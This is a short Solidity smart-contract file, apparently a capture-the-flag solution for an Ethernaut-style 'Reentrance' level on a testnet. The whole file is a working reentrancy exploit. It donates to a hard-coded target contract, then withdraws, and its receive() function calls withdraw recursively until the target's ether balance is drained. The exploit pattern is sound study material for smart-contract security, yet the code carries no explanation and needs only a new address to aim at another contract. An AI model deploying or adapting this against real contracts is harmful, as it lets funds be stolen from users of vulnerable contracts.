// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';
import './Reentrance.sol';

contract ReentranceHack {

  // revert may happen if gas paid is not sufficient due to multiple recursive call which makes it hard to estimate gas limit
  
  using SafeMath for uint256;
  Reentrance public re;
  address payable re_address;

  constructor() public payable {
    // instance of deployed reentrance.sol on rinkeby
    re_address = 0x225745CFA2d81354C6608f6f083aA0d39B31e95F;
    re = Reentrance(re_address);
  }
  function donate() public payable{
    re.donate{value: 0.0001 ether}(address(this));
  }

  function attack() public payable{
    re.withdraw(0.0001 ether);
  }

  receive() external payable{
    // recursively call each time we receive some ether
    if(address(re).balance != 0){
        re.withdraw(0.0001 ether);
    }
  }
}
